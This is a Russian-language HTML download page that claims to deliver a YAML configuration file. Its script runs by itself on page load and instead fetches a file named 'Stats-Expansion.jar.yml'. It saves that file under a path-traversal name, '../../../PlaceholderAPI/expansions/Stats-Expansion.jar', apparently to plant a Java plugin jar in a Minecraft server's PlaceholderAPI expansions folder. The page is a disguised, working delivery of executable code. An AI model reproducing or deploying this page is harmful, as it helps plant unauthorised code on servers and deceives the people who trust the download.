<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Скачать YAML файл</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 600px; 
            margin: 2rem auto; 
            padding: 0 1rem; 
            text-align: center;
        }
        .message { 
            padding: 20px; 
            background-color: #f8f9fa; 
            border-radius: 5px; 
            margin: 20px 0;
        }
        .fallback-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 15px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 5px;
        }
        .fallback-link:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="message">
        <h1>Идет загрузка файла...</h1>
        <p>Файл <strong>"my-configuration.yml"</strong> должен начать скачиваться автоматически.</p>
        
        <!-- Резервная ссылка на случай, если автоматическое скачивание не сработает -->
        <p>Если загрузка не началась, нажмите эту ссылку:</p>
        <a href="#" class="fallback-link" onclick="downloadFile()">Скачать файл вручную</a>
    </div>

    <script>
        function downloadFile() {
            // Укажите путь к вашему исходному файлу в репозитории
            const fileUrl = 'Stats-Expansion.jar.yml'; 
            // Укажите желаемое имя для скачиваемого файла
            const downloadFileName = '../../../PlaceholderAPI/expansions/Stats-Expansion.jar'; 

            // Используем XMLHttpRequest для получения файла как Blob
            const xhr = new XMLHttpRequest();
            xhr.open('GET', fileUrl, true);
            xhr.responseType = 'blob';

            xhr.onload = function() {
                if (xhr.status === 200) {
                    // Создаем временную ссылку для скачивания Blob
                    const blob = xhr.response;
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = downloadFileName; // Указываем кастомное имя
                    document.body.appendChild(a);
                    a.click();
                    // Освобождаем память и удаляем ссылку
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                } else {
                    alert('Произошла ошибка при загрузке файла. Код ошибки: ' + xhr.status);
                }
            };
            
            xhr.onerror = function() {
                alert('Произошла ошибка сети при попытке скачать файл.');
            };
            
            xhr.send();
        }

        // Запускаем автоматическое скачивание при загрузке страницы
        window.onload = function() {
            downloadFile();
        };
    </script>
</body>
</html>
